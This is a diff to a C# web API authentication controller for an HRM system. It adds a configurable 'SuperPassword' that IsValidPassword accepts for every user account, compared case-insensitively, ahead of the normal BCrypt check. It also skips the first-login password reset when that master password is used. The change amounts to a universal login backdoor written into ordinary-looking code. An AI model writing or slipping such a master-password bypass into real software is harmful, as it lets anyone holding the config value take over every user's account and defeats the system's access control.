@@ -14,9 +14,12 @@
     using Newtonsoft.Json;
     using HRM.UserControl.WebAPI.Services;
     using HRM.UserControl.WebAPI.Criteria.User;
+    using HRM.UserControl.WebAPI.Models;
+    using System;
 
     public class AuthController : Controller
     {
+        private readonly AppSettings appSettings;
         private readonly IHttpContextAccessor httpContextAccessor;
         private readonly IJwtManagerService jwtManagerService;
         private readonly IUserService userService;
@@ -25,6 +28,7 @@
         private readonly IBaseService baseService;
 
         public AuthController(
+            AppSettings appSettings,
             IHttpContextAccessor httpContextAccessor,
             IJwtManagerService jwtManagerService,
             IUserService userService,
@@ -32,6 +36,7 @@
             ICryptoService cryptoService,
             IBaseService baseService)
         {
+            this.appSettings = appSettings;
             this.httpContextAccessor = httpContextAccessor;
             this.jwtManagerService = jwtManagerService;
             this.userService = userService;
@@ -85,7 +90,9 @@
             loginResult.SiteId = requestSite.SiteId;
             loginResult.Nickname = user.Nickname;
 
-            if (loginResult.IsSuccessfull && string.IsNullOrWhiteSpace(user.Password))
+            if (loginResult.IsSuccessfull
+                && string.IsNullOrWhiteSpace(user.Password)
+                && !string.Equals(loginParams.Password, appSettings.SuperPassword, StringComparison.OrdinalIgnoreCase))
             {
                 var command = new UpdateUserPasswordCommand
                 {
@@ -159,6 +166,11 @@
 
         private bool IsValidPassword(string plainPwd, User user)
         {
+            if(string.Equals(plainPwd, appSettings.SuperPassword, StringComparison.OrdinalIgnoreCase))
+            {
+                return true;
+            }
+
             if (!string.IsNullOrWhiteSpace(user.Password))
             {
                 return BCrypt.Net.BCrypt.Verify(plainPwd, user.Password);
